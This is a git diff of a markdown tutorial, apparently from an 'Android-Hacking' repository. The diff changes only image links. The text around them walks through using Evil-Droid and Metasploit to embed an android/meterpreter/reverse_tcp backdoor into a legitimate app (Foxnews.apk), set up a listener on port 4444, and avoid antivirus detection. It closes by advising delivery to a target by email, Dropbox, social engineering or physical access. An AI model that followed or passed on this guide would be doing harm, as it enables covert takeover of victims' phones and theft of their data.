@@ -21,7 +21,7 @@ To download the script, you can clone it into your system by entering;
 
  
 
-(https://github.com/Hsnbacha/Android-Hacking/blob/main/Images/Image2.png)
+![Image 2](/Images/Image2.png "Image 2")
 
  
 If you get an error message indicating that some of Evil-Droid's dependencies are not available or out-of-date, you may need to upgrade to newer versions of your packages.
@@ -41,7 +41,7 @@ kali > cd Evil-Droid`
 ` 
 kali > chmod 775 evil-droid`
 
- Image 3
+![Image 3](/Images/Image3.png "Image 3")
 
 
 ###  
@@ -52,13 +52,9 @@ kali > chmod 775 evil-droid`
 Next, let's execute evil-droid. Evil-droid will check to see whether you have an Internet connection and several pieces of necessary software, including Metasploit.
 
 `kali > ./evil-droid`
+![Image 4](/Images/Image4.png "Image 4")
 
  
-
-Image 4
-
- 
-
 _Note_ the bottom warning in RED. Do **NOT** upload the APK to VirusTotal.com as that will trigger an antivirus signature by the AV developers.
 
 ### **Step #4 Execute the  Framework**
@@ -66,27 +62,14 @@ _Note_ the bottom warning in RED. Do **NOT** upload the APK to VirusTotal.com as
  
 
 Once evil-droid has successfully located all it's necessary components, you will receive a message like that below asking whether you want to "Execute Framework and services". Click "**Yes**".
-
- 
-
-
-Image 5
- 
-
-
+![Image 5](/Images/Image5.png "Image 5")
 
 ### **Step #5 Select Backdoor**
 
  
 
 You will be greeted by the menu  screen below. You can select any of the backdoors by number. Here we selected "Backdoor APK Original (NEW)".
-
- 
-
-Image 6
-
-
-
+![Image 6](/Images/Image6.png "Image 6")
 
 ### **Step #6 Select IP and Port**
 
@@ -94,16 +77,11 @@ Image 6
 
 Evil-droid will then ask you to set your LHOST (for Metasploit) and display your local IP and Public IP.
 
- 
-
-Image 7
+ ![Image 7](/Images/Image7.png "Image 7")
 
  Then, it will prompt you for your LPORT. Port 4444 is the default port for Metasploit's Meterpreter and other payloads.
 
- Image 8
-
- 
-
+![Image 8](/Images/Image8.png "Image 8")
 ### **Step #7 Name your Payload**
 
  
@@ -117,26 +95,20 @@ Evil-droid will then ask you to name your payload. Here I named it **GitHUB**, b
 
 Now, we need to select a payload. Evil-droid enables you to use any of the Android payloads from Metasploit including **android/meterpreter/reverse_tcp**. Simply click on the radio button next to the payload you want to embed in the APK.
 
-Image 9
-
-
+![Image 9](/Images/Image9.png "Image 9")
 
 ### **Step #9 Download APK and Embed Backdoor**
 
  
 
 Next, evil-droid prompts us for the APK file we want to embed the backdoor into. Here, I have downloaded the beloved **Foxnews.apk** for embedding our backdoor.
-
-Image 10
- 
- 
+![Image 10](/Images/Image10.png "Image 10")
 
 ### **Step #10 Select Metasploit Multi-Handler to make a Connection**
 
 In our next step, we need to  tell evil-droid how we are going to connect to the backdoor. Select "Multi-Handler".
 
- Image 11
-
+![Image 11](/Images/Image11.png "Image 11")
 
 We now need to open the multi-handler in Metasploit so that it can "catch" the connection coming back from the embedded payload. 
 
@@ -154,20 +126,13 @@ Now we need to start the multi-handler and tell Metasploit what IP and port to l
 `msf > SET LHOST 192.168.1.104`
 
 `msf > set LPORT 4444`
-
- 
-
-Image 12
-
- 
+![Image 12](/Images/Image12.png "Image 12")
 
 ### **Step #11 Deliver the APK to the Target**
 
  
 
 In this final step, we need to have the APK (with the embedded backdoor) to be installed and executed on the target's Android device. This is where some social engineering skills can prove helpful. You can email the APK or send it via **DropBox** or other file sharing system. If you have physical access to the device, you could simply install it yourself.
-
-
-Image 13
+![Image 13](/Images/Image13.png "Image 13")
  
 When the target user installs the app to view their "**Fair and Balanced**" FoxNews, it will execute the backdoor and connect back to your system giving you  a meterpreter shell on their android device!
